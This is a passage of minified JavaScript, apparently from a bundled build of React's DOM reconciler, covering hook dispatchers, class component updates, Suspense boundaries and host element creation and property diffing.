cp(4,2,n,e)}function sA(n,e){return cp(4,4,n,e)}function oA(n,e){if(typeof e=="function")return n=n(),e(n),function(){e(null)};if(e!=null)return n=n(),e.current=n,function(){e.current=null}}function aA(n,e,t){return t=t!=null?t.concat([n]):null,cp(4,4,oA.bind(null,e,n),t)}function Tw(){}function lA(n,e){var t=Yr();e=e===void 0?null:e;var r=t.memoizedState;return r!==null&&e!==null&&_w(e,r[1])?r[0]:(t.memoizedState=[n,e],n)}function cA(n,e){var t=Yr();e=e===void 0?null:e;var r=t.memoizedState;return r!==null&&e!==null&&_w(e,r[1])?r[0]:(n=n(),t.memoizedState=[n,e],n)}function uA(n,e,t){return aa&21?(pi(t,e)||(t=gT(),qt.lanes|=t,la|=t,n.baseState=!0),e):(n.baseState&&(n.baseState=!1,wr=!0),n.memoizedState=t)}function rN(n,e){var t=ft;ft=t!==0&&4>t?t:4,n(!0);var r=Ug.transition;Ug.transition={};try{n(!1),e()}finally{ft=t,Ug.transition=r}}function hA(){return Yr().memoizedState}function iN(n,e,t){var r=to(n);if(t={lane:r,action:t,hasEagerState:!1,eagerState:null,next:null},fA(n))dA(e,t);else if(t=KT(n,e,t,r),t!==null){var i=or();ui(t,n,r,i),pA(t,e,r)}}function sN(n,e,t){var r=to(n),i={lane:r,action:t,hasEagerState:!1,eagerState:null,next:null};if(fA(n))dA(e,i);else{var s=n.alternate;if(n.lanes===0&&(s===null||s.lanes===0)&&(s=e.lastRenderedReducer,s!==null))try{var o=e.lastRenderedState,a=s(o,t);if(i.hasEagerState=!0,i.eagerState=a,pi(a,o)){var l=e.interleaved;l===null?(i.next=i,gw(e)):(i.next=l.next,l.next=i),e.interleaved=i;return}}catch{}finally{}t=KT(n,e,i,r),t!==null&&(i=or(),ui(t,n,r,i),pA(t,e,r))}}function fA(n){var e=n.alternate;return n===qt||e!==null&&e===qt}function dA(n,e){ou=fd=!0;var t=n.pending;t===null?e.next=e:(e.next=t.next,t.next=e),n.pending=e}function pA(n,e,t){if(t&4194240){var r=e.lanes;r&=n.pendingLanes,t|=r,e.lanes=t,tw(n,t)}}var dd={readContext:Qr,useCallback:$n,useContext:$n,useEffect:$n,useImperativeHandle:$n,useInsertionEffect:$n,useLayoutEffect:$n,useMemo:$n,useReducer:$n,useRef:$n,useState:$n,useDebugValue:$n,useDeferredValue:$n,useTransition:$n,useMutableSource:$n,useSyncExternalStore:$n,useId:$n,unstable_isNewReconciler:!1},oN={readContext:Qr,useCallback:function(n,e){return _i().memoizedState=[n,e===void 0?null:e],n},useContext:Qr,useEffect:N_,useImperativeHandle:function(n,e,t){return t=t!=null?t.concat([n]):null,xf(4194308,4,oA.bind(null,e,n),t)},useLayoutEffect:function(n,e){return xf(4194308,4,n,e)},useInsertionEffect:function(n,e){return xf(4,2,n,e)},useMemo:function(n,e){var t=_i();return e=e===void 0?null:e,n=n(),t.memoizedState=[n,e],n},useReducer:function(n,e,t){var r=_i();return e=t!==void 0?t(e):e,r.memoizedState=r.baseState=e,n={pending:null,interleaved:null,lanes:0,dispatch:null,lastRenderedReducer:n,lastRenderedState:e},r.queue=n,n=n.dispatch=iN.bind(null,qt,n),[r.memoizedState,n]},useRef:function(n){var e=_i();return n={current:n},e.memoizedState=n},useState:M_,useDebugValue:Tw,useDeferredValue:function(n){return _i().memoizedState=n},useTransition:function(){var n=M_(!1),e=n[0];return n=rN.bind(null,n[1]),_i().memoizedState=n,[e,n]},useMutableSource:function(){},useSyncExternalStore:function(n,e,t){var r=qt,i=_i();if(jt){if(t===void 0)throw Error(le(407));t=t()}else{if(t=e(),bn===null)throw Error(le(349));aa&30||JT(r,e,t)}i.memoizedState=t;var s={value:t,getSnapshot:e};return i.queue=s,N_(eA.bind(null,r,s,n),[n]),r.flags|=2048,Lu(9,XT.bind(null,r,s,t,e),void 0,null),t},useId:function(){var n=_i(),e=bn.identifierPrefix;if(jt){var t=Xi,r=Ji;t=(r&~(1<<32-ci(r)-1)).toString(32)+t,e=":"+e+"R"+t,t=Nu++,0<t&&(e+="H"+t.toString(32)),e+=":"}else t=nN++,e=":"+e+"r"+t.toString(32)+":";return n.memoizedState=e},unstable_isNewReconciler:!1},aN={readContext:Qr,useCallback:lA,useContext:Qr,useEffect:Sw,useImperativeHandle:aA,useInsertionEffect:iA,useLayoutEffect:sA,useMemo:cA,useReducer:jg,useRef:rA,useState:function(){return jg(Pu)},useDebugValue:Tw,useDeferredValue:function(n){var e=Yr();return uA(e,gn.memoizedState,n)},useTransition:function(){var n=jg(Pu)[0],e=Yr().memoizedState;return[n,e]},useMutableSource:YT,useSyncExternalStore:ZT,useId:hA,unstable_isNewReconciler:!1},lN={readContext:Qr,useCallback:lA,useContext:Qr,useEffect:Sw,useImperativeHandle:aA,useInsertionEffect:iA,useLayoutEffect:sA,useMemo:cA,useReducer:Vg,useRef:rA,useState:function(){return Vg(Pu)},useDebugValue:Tw,useDeferredValue:function(n){var e=Yr();return gn===null?e.memoizedState=n:uA(e,gn.memoizedState,n)},useTransition:function(){var n=Vg(Pu)[0],e=Yr().memoizedState;return[n,e]},useMutableSource:YT,useSyncExternalStore:ZT,useId:hA,unstable_isNewReconciler:!1};function ni(n,e){if(n&&n.defaultProps){e=Kt({},e),n=n.defaultProps;for(var t in n)e[t]===void 0&&(e[t]=n[t]);return e}return e}function m0(n,e,t,r){e=n.memoizedState,t=t(r,e),t=t==null?e:Kt({},e,t),n.memoizedState=t,n.lanes===0&&(n.updateQueue.baseState=t)}var up={isMounted:function(n){return(n=n._reactInternals)?va(n)===n:!1},enqueueSetState:function(n,e,t){n=n._reactInternals;var r=or(),i=to(n),s=ss(r,i);s.payload=e,t!=null&&(s.callback=t),e=Xs(n,s,i),e!==null&&(ui(e,n,i,r),Af(e,n,i))},enqueueReplaceState:function(n,e,t){n=n._reactInternals;var r=or(),i=to(n),s=ss(r,i);s.tag=1,s.payload=e,t!=null&&(s.callback=t),e=Xs(n,s,i),e!==null&&(ui(e,n,i,r),Af(e,n,i))},enqueueForceUpdate:function(n,e){n=n._reactInternals;var t=or(),r=to(n),i=ss(t,r);i.tag=2,e!=null&&(i.callback=e),e=Xs(n,i,r),e!==null&&(ui(e,n,r,t),Af(e,n,r))}};function P_(n,e,t,r,i,s,o){return n=n.stateNode,typeof n.shouldComponentUpdate=="function"?n.shouldComponentUpdate(r,s,o):e.prototype&&e.prototype.isPureReactComponent?!bu(t,r)||!bu(i,s):!0}function gA(n,e,t){var r=!1,i=po,s=e.contextType;return typeof s=="object"&&s!==null?s=Qr(s):(i=_r(e)?sa:nr.current,r=e.contextTypes,s=(r=r!=null)?Cl(n,i):po),e=new e(t,s),n.memoizedState=e.state!==null&&e.state!==void 0?e.state:null,e.updater=up,n.stateNode=e,e._reactInternals=n,r&&(n=n.stateNode,n.__reactInternalMemoizedUnmaskedChildContext=i,n.__reactInternalMemoizedMaskedChildContext=s),e}function L_(n,e,t,r){n=e.state,typeof e.componentWillReceiveProps=="function"&&e.componentWillReceiveProps(t,r),typeof e.UNSAFE_componentWillReceiveProps=="function"&&e.UNSAFE_componentWillReceiveProps(t,r),e.state!==n&&up.enqueueReplaceState(e,e.state,null)}function y0(n,e,t,r){var i=n.stateNode;i.props=t,i.state=n.memoizedState,i.refs={},mw(n);var s=e.contextType;typeof s=="object"&&s!==null?i.context=Qr(s):(s=_r(e)?sa:nr.current,i.context=Cl(n,s)),i.state=n.memoizedState,s=e.getDerivedStateFromProps,typeof s=="function"&&(m0(n,e,s,t),i.state=n.memoizedState),typeof e.getDerivedStateFromProps=="function"||typeof i.getSnapshotBeforeUpdate=="function"||typeof i.UNSAFE_componentWillMount!="function"&&typeof i.componentWillMount!="function"||(e=i.state,typeof i.componentWillMount=="function"&&i.componentWillMount(),typeof i.UNSAFE_componentWillMount=="function"&&i.UNSAFE_componentWillMount(),e!==i.state&&up.enqueueReplaceState(i,i.state,null),ud(n,t,i,r),i.state=n.memoizedState),typeof i.componentDidMount=="function"&&(n.flags|=4194308)}function Pl(n,e){try{var t="",r=e;do t+=OR(r),r=r.return;while(r);var i=t}catch(s){i=`
Error generating stack: `+s.message+`
`+s.stack}return{value:n,source:e,stack:i,digest:null}}function Fg(n,e,t){return{value:n,source:null,stack:t??null,digest:e??null}}function w0(n,e){try{console.error(e.value)}catch(t){setTimeout(function(){throw t})}}var cN=typeof WeakMap=="function"?WeakMap:Map;function mA(n,e,t){t=ss(-1,t),t.tag=3,t.payload={element:null};var r=e.value;return t.callback=function(){gd||(gd=!0,k0=r),w0(n,e)},t}function yA(n,e,t){t=ss(-1,t),t.tag=3;var r=n.type.getDerivedStateFromError;if(typeof r=="function"){var i=e.value;t.payload=function(){return r(i)},t.callback=function(){w0(n,e)}}var s=n.stateNode;return s!==null&&typeof s.componentDidCatch=="function"&&(t.callback=function(){w0(n,e),typeof r!="function"&&(eo===null?eo=new Set([this]):eo.add(this));var o=e.stack;this.componentDidCatch(e.value,{componentStack:o!==null?o:""})}),t}function D_(n,e,t){var r=n.pingCache;if(r===null){r=n.pingCache=new cN;var i=new Set;r.set(e,i)}else i=r.get(e),i===void 0&&(i=new Set,r.set(e,i));i.has(t)||(i.add(t),n=SN.bind(null,n,e,t),e.then(n,n))}function O_(n){do{var e;if((e=n.tag===13)&&(e=n.memoizedState,e=e!==null?e.dehydrated!==null:!0),e)return n;n=n.return}while(n!==null);return null}function B_(n,e,t,r,i){return n.mode&1?(n.flags|=65536,n.lanes=i,n):(n===e?n.flags|=65536:(n.flags|=128,t.flags|=131072,t.flags&=-52805,t.tag===1&&(t.alternate===null?t.tag=17:(e=ss(-1,1),e.tag=2,Xs(t,e,1))),t.lanes|=1),n)}var uN=vs.ReactCurrentOwner,wr=!1;function ir(n,e,t,r){e.child=n===null?qT(e,null,t,r):Ml(e,n.child,t,r)}function U_(n,e,t,r,i){t=t.render;var s=e.ref;return wl(e,i),r=Ew(n,e,t,r,s,i),t=Iw(),n!==null&&!wr?(e.updateQueue=n.updateQueue,e.flags&=-2053,n.lanes&=~i,hs(n,e,i)):(jt&&t&&cw(e),e.flags|=1,ir(n,e,r,i),e.child)}function j_(n,e,t,r,i){if(n===null){var s=t.type;return typeof s=="function"&&!Nw(s)&&s.defaultProps===void 0&&t.compare===null&&t.defaultProps===void 0?(e.tag=15,e.type=s,wA(n,e,s,r,i)):(n=Mf(t.type,null,r,e,e.mode,i),n.ref=e.ref,n.return=e,e.child=n)}if(s=n.child,!(n.lanes&i)){var o=s.memoizedProps;if(t=t.compare,t=t!==null?t:bu,t(o,r)&&n.ref===e.ref)return hs(n,e,i)}return e.flags|=1,n=no(s,r),n.ref=e.ref,n.return=e,e.child=n}function wA(n,e,t,r,i){if(n!==null){var s=n.memoizedProps;if(bu(s,r)&&n.ref===e.ref)if(wr=!1,e.pendingProps=r=s,(n.lanes&i)!==0)n.flags&131072&&(wr=!0);else return e.lanes=n.lanes,hs(n,e,i)}return v0(n,e,t,r,i)}function vA(n,e,t){var r=e.pendingProps,i=r.children,s=n!==null?n.memoizedState:null;if(r.mode==="hidden")if(!(e.mode&1))e.memoizedState={baseLanes:0,cachePool:null,transitions:null},Tt(ll,Sr),Sr|=t;else{if(!(t&1073741824))return n=s!==null?s.baseLanes|t:t,e.lanes=e.childLanes=1073741824,e.memoizedState={baseLanes:n,cachePool:null,transitions:null},e.updateQueue=null,Tt(ll,Sr),Sr|=n,null;e.memoizedState={baseLanes:0,cachePool:null,transitions:null},r=s!==null?s.baseLanes:t,Tt(ll,Sr),Sr|=r}else s!==null?(r=s.baseLanes|t,e.memoizedState=null):r=t,Tt(ll,Sr),Sr|=r;return ir(n,e,i,t),e.child}function _A(n,e){var t=e.ref;(n===null&&t!==null||n!==null&&n.ref!==t)&&(e.flags|=512,e.flags|=2097152)}function v0(n,e,t,r,i){var s=_r(t)?sa:nr.current;return s=Cl(e,s),wl(e,i),t=Ew(n,e,t,r,s,i),r=Iw(),n!==null&&!wr?(e.updateQueue=n.updateQueue,e.flags&=-2053,n.lanes&=~i,hs(n,e,i)):(jt&&r&&cw(e),e.flags|=1,ir(n,e,t,i),e.child)}function V_(n,e,t,r,i){if(_r(t)){var s=!0;sd(e)}else s=!1;if(wl(e,i),e.stateNode===null)kf(n,e),gA(e,t,r),y0(e,t,r,i),r=!0;else if(n===null){var o=e.stateNode,a=e.memoizedProps;o.props=a;var l=o.context,u=t.contextType;typeof u=="object"&&u!==null?u=Qr(u):(u=_r(t)?sa:nr.current,u=Cl(e,u));var h=t.getDerivedStateFromProps,f=typeof h=="function"||typeof o.getSnapshotBeforeUpdate=="function";f||typeof o.UNSAFE_componentWillReceiveProps!="function"&&typeof o.componentWillReceiveProps!="function"||(a!==r||l!==u)&&L_(e,o,r,u),Ls=!1;var p=e.memoizedState;o.state=p,ud(e,r,o,i),l=e.memoizedState,a!==r||p!==l||vr.current||Ls?(typeof h=="function"&&(m0(e,t,h,r),l=e.memoizedState),(a=Ls||P_(e,t,a,r,p,l,u))?(f||typeof o.UNSAFE_componentWillMount!="function"&&typeof o.componentWillMount!="function"||(typeof o.componentWillMount=="function"&&o.componentWillMount(),typeof o.UNSAFE_componentWillMount=="function"&&o.UNSAFE_componentWillMount()),typeof o.componentDidMount=="function"&&(e.flags|=4194308)):(typeof o.componentDidMount=="function"&&(e.flags|=4194308),e.memoizedProps=r,e.memoizedState=l),o.props=r,o.state=l,o.context=u,r=a):(typeof o.componentDidMount=="function"&&(e.flags|=4194308),r=!1)}else{o=e.stateNode,GT(n,e),a=e.memoizedProps,u=e.type===e.elementType?a:ni(e.type,a),o.props=u,f=e.pendingProps,p=o.context,l=t.contextType,typeof l=="object"&&l!==null?l=Qr(l):(l=_r(t)?sa:nr.current,l=Cl(e,l));var w=t.getDerivedStateFromProps;(h=typeof w=="function"||typeof o.getSnapshotBeforeUpdate=="function")||typeof o.UNSAFE_componentWillReceiveProps!="function"&&typeof o.componentWillReceiveProps!="function"||(a!==f||p!==l)&&L_(e,o,r,l),Ls=!1,p=e.memoizedState,o.state=p,ud(e,r,o,i);var x=e.memoizedState;a!==f||p!==x||vr.current||Ls?(typeof w=="function"&&(m0(e,t,w,r),x=e.memoizedState),(u=Ls||P_(e,t,u,r,p,x,l)||!1)?(h||typeof o.UNSAFE_componentWillUpdate!="function"&&typeof o.componentWillUpdate!="function"||(typeof o.componentWillUpdate=="function"&&o.componentWillUpdate(r,x,l),typeof o.UNSAFE_componentWillUpdate=="function"&&o.UNSAFE_componentWillUpdate(r,x,l)),typeof o.componentDidUpdate=="function"&&(e.flags|=4),typeof o.getSnapshotBeforeUpdate=="function"&&(e.flags|=1024)):(typeof o.componentDidUpdate!="function"||a===n.memoizedProps&&p===n.memoizedState||(e.flags|=4),typeof o.getSnapshotBeforeUpdate!="function"||a===n.memoizedProps&&p===n.memoizedState||(e.flags|=1024),e.memoizedProps=r,e.memoizedState=x),o.props=r,o.state=x,o.context=l,r=u):(typeof o.componentDidUpdate!="function"||a===n.memoizedProps&&p===n.memoizedState||(e.flags|=4),typeof o.getSnapshotBeforeUpdate!="function"||a===n.memoizedProps&&p===n.memoizedState||(e.flags|=1024),r=!1)}return _0(n,e,t,r,s,i)}function _0(n,e,t,r,i,s){_A(n,e);var o=(e.flags&128)!==0;if(!r&&!o)return i&&A_(e,t,!1),hs(n,e,s);r=e.stateNode,uN.current=e;var a=o&&typeof t.getDerivedStateFromError!="function"?null:r.render();return e.flags|=1,n!==null&&o?(e.child=Ml(e,n.child,null,s),e.child=Ml(e,null,a,s)):ir(n,e,a,s),e.memoizedState=r.state,i&&A_(e,t,!0),e.child}function EA(n){var e=n.stateNode;e.pendingContext?T_(n,e.pendingContext,e.pendingContext!==e.context):e.context&&T_(n,e.context,!1),yw(n,e.containerInfo)}function F_(n,e,t,r,i){return Rl(),hw(i),e.flags|=256,ir(n,e,t,r),e.child}var E0={dehydrated:null,treeContext:null,retryLane:0};function I0(n){return{baseLanes:n,cachePool:null,transitions:null}}function IA(n,e,t){var r=e.pendingProps,i=Wt.current,s=!1,o=(e.flags&128)!==0,a;if((a=o)||(a=n!==null&&n.memoizedState===null?!1:(i&2)!==0),a?(s=!0,e.flags&=-129):(n===null||n.memoizedState!==null)&&(i|=1),Tt(Wt,i&1),n===null)return p0(e),n=e.memoizedState,n!==null&&(n=n.dehydrated,n!==null)?(e.mode&1?n.data==="$!"?e.lanes=8:e.lanes=1073741824:e.lanes=1,null):(o=r.children,n=r.fallback,s?(r=e.mode,s=e.child,o={mode:"hidden",children:o},!(r&1)&&s!==null?(s.childLanes=0,s.pendingProps=o):s=dp(o,r,0,null),n=ta(n,r,t,null),s.return=e,n.return=e,s.sibling=n,e.child=s,e.child.memoizedState=I0(t),e.memoizedState=E0,n):Aw(e,o));if(i=n.memoizedState,i!==null&&(a=i.dehydrated,a!==null))return hN(n,e,o,r,a,i,t);if(s){s=r.fallback,o=e.mode,i=n.child,a=i.sibling;var l={mode:"hidden",children:r.children};return!(o&1)&&e.child!==i?(r=e.child,r.childLanes=0,r.pendingProps=l,e.deletions=null):(r=no(i,l),r.subtreeFlags=i.subtreeFlags&14680064),a!==null?s=no(a,s):(s=ta(s,o,t,null),s.flags|=2),s.return=e,r.return=e,r.sibling=s,e.child=r,r=s,s=e.child,o=n.child.memoizedState,o=o===null?I0(t):{baseLanes:o.baseLanes|t,cachePool:null,transitions:o.transitions},s.memoizedState=o,s.childLanes=n.childLanes&~t,e.memoizedState=E0,r}return s=n.child,n=s.sibling,r=no(s,{mode:"visible",children:r.children}),!(e.mode&1)&&(r.lanes=t),r.return=e,r.sibling=null,n!==null&&(t=e.deletions,t===null?(e.deletions=[n],e.flags|=16):t.push(n)),e.child=r,e.memoizedState=null,r}function Aw(n,e){return e=dp({mode:"visible",children:e},n.mode,0,null),e.return=n,n.child=e}function Xh(n,e,t,r){return r!==null&&hw(r),Ml(e,n.child,null,t),n=Aw(e,e.pendingProps.children),n.flags|=2,e.memoizedState=null,n}function hN(n,e,t,r,i,s,o){if(t)return e.flags&256?(e.flags&=-257,r=Fg(Error(le(422))),Xh(n,e,o,r)):e.memoizedState!==null?(e.child=n.child,e.flags|=128,null):(s=r.fallback,i=e.mode,r=dp({mode:"visible",children:r.children},i,0,null),s=ta(s,i,o,null),s.flags|=2,r.return=e,s.return=e,r.sibling=s,e.child=r,e.mode&1&&Ml(e,n.child,null,o),e.child.memoizedState=I0(o),e.memoizedState=E0,s);if(!(e.mode&1))return Xh(n,e,o,null);if(i.data==="$!"){if(r=i.nextSibling&&i.nextSibling.dataset,r)var a=r.dgst;return r=a,s=Error(le(419)),r=Fg(s,r,void 0),Xh(n,e,o,r)}if(a=(o&n.childLanes)!==0,wr||a){if(r=bn,r!==null){switch(o&-o){case 4:i=2;break;case 16:i=8;break;case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:i=32;break;case 536870912:i=268435456;break;default:i=0}i=i&(r.suspendedLanes|o)?0:i,i!==0&&i!==s.retryLane&&(s.retryLane=i,us(n,i),ui(r,n,i,-1))}return Mw(),r=Fg(Error(le(421))),Xh(n,e,o,r)}return i.data==="$?"?(e.flags|=128,e.child=n.child,e=TN.bind(null,n),i._reactRetry=e,null):(n=s.treeContext,Cr=Js(i.nextSibling),Mr=e,jt=!0,si=null,n!==null&&(zr[Wr++]=Ji,zr[Wr++]=Xi,zr[Wr++]=oa,Ji=n.id,Xi=n.overflow,oa=e),e=Aw(e,r.children),e.flags|=4096,e)}function z_(n,e,t){n.lanes|=e;var r=n.alternate;r!==null&&(r.lanes|=e),g0(n.return,e,t)}function zg(n,e,t,r,i){var s=n.memoizedState;s===null?n.memoizedState={isBackwards:e,rendering:null,renderingStartTime:0,last:r,tail:t,tailMode:i}:(s.isBackwards=e,s.rendering=null,s.renderingStartTime=0,s.last=r,s.tail=t,s.tailMode=i)}function SA(n,e,t){var r=e.pendingProps,i=r.revealOrder,s=r.tail;if(ir(n,e,r.children,t),r=Wt.current,r&2)r=r&1|2,e.flags|=128;else{if(n!==null&&n.flags&128)e:for(n=e.child;n!==null;){if(n.tag===13)n.memoizedState!==null&&z_(n,t,e);else if(n.tag===19)z_(n,t,e);else if(n.child!==null){n.child.return=n,n=n.child;continue}if(n===e)break e;for(;n.sibling===null;){if(n.return===null||n.return===e)break e;n=n.return}n.sibling.return=n.return,n=n.sibling}r&=1}if(Tt(Wt,r),!(e.mode&1))e.memoizedState=null;else switch(i){case"forwards":for(t=e.child,i=null;t!==null;)n=t.alternate,n!==null&&hd(n)===null&&(i=t),t=t.sibling;t=i,t===null?(i=e.child,e.child=null):(i=t.sibling,t.sibling=null),zg(e,!1,i,t,s);break;case"backwards":for(t=null,i=e.child,e.child=null;i!==null;){if(n=i.alternate,n!==null&&hd(n)===null){e.child=i;break}n=i.sibling,i.sibling=t,t=i,i=n}zg(e,!0,t,null,s);break;case"together":zg(e,!1,null,null,void 0);break;default:e.memoizedState=null}return e.child}function kf(n,e){!(e.mode&1)&&n!==null&&(n.alternate=null,e.alternate=null,e.flags|=2)}function hs(n,e,t){if(n!==null&&(e.dependencies=n.dependencies),la|=e.lanes,!(t&e.childLanes))return null;if(n!==null&&e.child!==n.child)throw Error(le(153));if(e.child!==null){for(n=e.child,t=no(n,n.pendingProps),e.child=t,t.return=e;n.sibling!==null;)n=n.sibling,t=t.sibling=no(n,n.pendingProps),t.return=e;t.sibling=null}return e.child}function fN(n,e,t){switch(e.tag){case 3:EA(e),Rl();break;case 5:QT(e);break;case 1:_r(e.type)&&sd(e);break;case 4:yw(e,e.stateNode.containerInfo);break;case 10:var r=e.type._context,i=e.memoizedProps.value;Tt(ld,r._currentValue),r._currentValue=i;break;case 13:if(r=e.memoizedState,r!==null)return r.dehydrated!==null?(Tt(Wt,Wt.current&1),e.flags|=128,null):t&e.child.childLanes?IA(n,e,t):(Tt(Wt,Wt.current&1),n=hs(n,e,t),n!==null?n.sibling:null);Tt(Wt,Wt.current&1);break;case 19:if(r=(t&e.childLanes)!==0,n.flags&128){if(r)return SA(n,e,t);e.flags|=128}if(i=e.memoizedState,i!==null&&(i.rendering=null,i.tail=null,i.lastEffect=null),Tt(Wt,Wt.current),r)break;return null;case 22:case 23:return e.lanes=0,vA(n,e,t)}return hs(n,e,t)}var TA,S0,AA,bA;TA=function(n,e){for(var t=e.child;t!==null;){if(t.tag===5||t.tag===6)n.appendChild(t.stateNode);else if(t.tag!==4&&t.child!==null){t.child.return=t,t=t.child;continue}if(t===e)break;for(;t.sibling===null;){if(t.return===null||t.return===e)return;t=t.return}t.sibling.return=t.return,t=t.sibling}};S0=function(){};AA=function(n,e,t,r){var i=n.memoizedProps;if(i!==r){n=e.stateNode,qo(xi.current);var s=null;switch(t){case"input":i=Hm(n,i),r=Hm(n,r),s=[];break;case"select":i=Kt({},i,{value:void 0}),r=Kt({},r,{value:void 0}),s=[];break;case"textarea":i=Gm(n,i),r=Gm(n,r),s=[];break;default:typeof i.onClick!="function"&&typeof r.onClick=="function"&&(n.onclick=rd)}Ym(t,r);var o;t=null;for(u in i)if(!r.hasOwnProperty(u)&&i.hasOwnProperty(u)&&i[u]!=null)if(u==="style"){var a=i[u];for(o in a)a.hasOwnProperty(o)&&(t||(t={}),t[o]="")}else u!=="dangerouslySetInnerHTML"&&u!=="children"&&u!=="suppressContentEditableWarning"&&u!=="suppressHydrationWarning"&&u!=="autoFocus"&&(vu.hasOwnProperty(u)?s||(s=[]):(s=s||[]).push(u,null));for(u in r){var l=r[u];if(a=i!=null?i[u]:void 0,r.hasOwnProperty(u)&&l!==a&&(l!=null||a!=null))if(u==="style")if(a){for(o in a)!a.hasOwnProperty(o)||l&&l.hasOwnProperty(o)||(t||(t={}),t[o]="");for(o in l)l.hasOwnProperty(o)&&a[o]!==l[o]&&(t||(t={}),t[o]=l[o])}else t||(s||(s=[]),s.push(u,t)),t=l;else u==="dangerouslySetInnerHTML"?(l=l?l.__html:void 0,a=a?a.__html:void 0,l!=null&&a!==l&&(s=s||[]).push(u,l)):u==="children"?typeof l!="string"&&typeof l!="number"||(s=s||[]).push(u,""+l):u!=="suppressContentEditableWarning"&&u!=="suppressHydrationWarning"&&(vu.hasOwnProperty(u)?(l!=null&&u==="onScroll"&&Ct("scroll",n),s||a===l||(s=[])):(s=s||[]).push(u,l))}t&&(s=s||[]).push("style",t);var u=s;(e.updateQueue=u)&&(e.flags|=4)}};bA=function(n,e,t,r){t!==r&&(e.flags|=4)};function Uc(n,e){if(!jt)switch(n.tailMode){case"hidden":e=n.tail;for(var t=null;e!==null;)e.alternate!==null&&(t=e),e=e.sibling;t===null?n.tail=null:t.sibling=null;break;case"collapsed":t=n.tail;for(var r=null;t!==null;)t.alternate!==null&&(r=t),t=t.sibling;r===null?e||n.tail===null?n.tail=null:n.tail.sibling=null:r.sibling=null}}function Hn(n){var e=n.alternate!==null&&n.alternate.child===n.child,t=0,r=0;if(e)for(var i=n.child;i!==null;)t|=i.lanes|i.childLanes,r|=i.subtreeFlags&14680064,r|=i.flags&14680064,i.return=n,i=i.sibling;else for(i=n.child;i!==null;)t|=i.lanes|i.childLanes,r|=i.subtreeFlags,r|=i.flags,i.return=n,i=i.sibling;return n.subtreeFlags|=r,n.childLanes=t,e}function dN(n,e,t){var r=e.pendingProps;switch(uw(e),e.tag){case 2:case 16:case 15:case 0:case 11:case 7:case 8:case 12:case 9:case 14:return Hn(e),null;case 1:return _r(e.type)&&id(),Hn(e),null;case 3:return r=e.stateNode,Nl(),Nt(vr),Nt(nr),vw(),r.pendingContext&&(r.context=r.pendingContext,r.pendingContext=null),(n===null||n.child===null)&&(Zh(e)?e.flags|=4:n===null||n.memoizedState.isDehydrated&&!(e.flags&256)||(e.flags|=1024,si!==null&&(M0(si),si=null))),S0(n,e),Hn(e),null;case 5:ww(e);var i=qo(Mu.current);if(t=e.type,n!==null&&e.stateNode!=null)AA(n,e,t,r,i),n.ref!==e.ref&&(e.flags|=512,e.flags|=2097152);else{if(!r){if(e.stateNode===null)throw Error(le(166));return Hn(e),null}if(n=qo(xi.current),Zh(e)){r=e.stateNode,t=e.type;var s=e.memoizedProps;switch(r[Ti]=e,r[Cu]=s,n=(e.mode&1)!==0,t){case"dialog":Ct("cancel",r),Ct("close",r);break;case"iframe":case"object":case"embed":Ct("load",r);break;case"video":case"audio":for(i=0;i<qc.length;i++)Ct(qc[i],r);break;case"source":Ct("error",r);break;case"img":case"image":case"link":Ct("error",r),Ct("load",r);break;case"details":Ct("toggle",r);break;case"input":Z1(r,s),Ct("invalid",r);break;case"select":r._wrapperState={wasMultiple:!!s.multiple},Ct("invalid",r);break;case"textarea":X1(r,s),Ct("invalid",r)}Ym(t,s),i=null;for(var o in s)if(s.hasOwnProperty(o)){var a=s[o];o==="children"?typeof a=="string"?r.textContent!==a&&(s.suppressHydrationWarning!==!0&&Yh(r.textContent,a,n),i=["children",a]):typeof a=="number"&&r.textContent!==""+a&&(s.suppressHydrationWarning!==!0&&Yh(r.textContent,a,n),i=["children",""+a]):vu.hasOwnProperty(o)&&a!=null&&o==="onScroll"&&Ct("scroll",r)}switch(t){case"input":zh(r),J1(r,s,!0);break;case"textarea":zh(r),e_(r);break;case"select":case"option":break;default:typeof s.onClick=="function"&&(r.onclick=rd)}r=i,e.updateQueue=r,r!==null&&(e.flags|=4)}else{o=i.nodeType===9?i:i.ownerDocument,n==="http://www.w3.org/1999/xhtml"&&(n=eT(t)),n==="http://www.w3.org/1999/xhtml"?t==="script"?(n=o.createElement("div"),n.innerHTML="<script><\/script>",n=n.removeChild(n.firstChild)):typeof r.is=="string"?n=o.createElement(t,{is:r.is}):(n=o.createElement(t),t==="select"&&(o=n,r.multiple?o.multiple=!0:r.size&&(o.size=r.size))):n=o.createElementNS(n,t),n[Ti]=e,n[Cu]=r,TA(n,e,!1,!1),e.stateNode=n;e:{switch(o=Zm(t,r),t){case"dialog":Ct("cancel",n),Ct("close",n),i=r;break;case"iframe":case"object":case"embed":Ct("load",n),i=r;break;case"video":case"audio":for(i=0;i<qc.length;i++)Ct(qc[i],n);i=r;break;case"source":Ct("error",n),i=r;break;case"img":case"image":case"link":Ct("error",n),Ct("load",n),i=r;break;case"details":Ct("toggle",n),i=r;break;case"input":Z1(n,r),i=Hm(n,r),Ct("invalid",n);break;case"option":i=r;break;case"select":n._wrapperState={wasMultiple:!!r.multiple},i=Kt({},r,{value:void 0}),Ct("invalid",n);break;case"textarea":X1(n,r),i=Gm(n,r),Ct("invalid",n);break;default:i=r}Ym(t,i),a=i;for(s in a)if(a.hasOwnProperty(s)){var l=a[s];s==="style"?rT(n,l):s==="dangerouslySetInnerHTML"?(l=l?l.__html:void 0,l!=null&&tT(n,l)):s==="children"?typeof l=="string"?(t!=="textarea"||l!=="")&&_u(n,l):typeof l=="number"&&_u(n,""+l):s!=="suppressContentEditableWarning"&&s!=="suppressHydrationWarning"&&s!=="autoFocus"&&(vu.hasOwnProperty(s)?l!=null&&s==="onScroll"&&Ct("scroll",n):l!=null&&Qy(n,s,l,o))}switch(t){case"input":zh(n),J1(n,r,!1);break;case"textarea":zh(n),e_(n);break;case"option":r.value!=null&&n.setAttribute("value",""+fo(r.value));break;case"select":n.multiple=!!r.multiple,s=r.value,s!=null?pl(n,!!r.multiple,s,!1):r.defaultValue!=null&&pl(n,!!r.multiple,r.defaultValue,!0);break;default:typeof i.onClick=="function"&&(n.onclick=rd)}switch(t){case"button":case"input":case"select":case"textarea":r=!!r.autoFocus;break e;case"img":r=!0;break e;default:r=!1}}r&&(e.flags|=4)}e.ref!==null&&(e.flags|=512,e.flags|=2097152)}return Hn(e),null;case 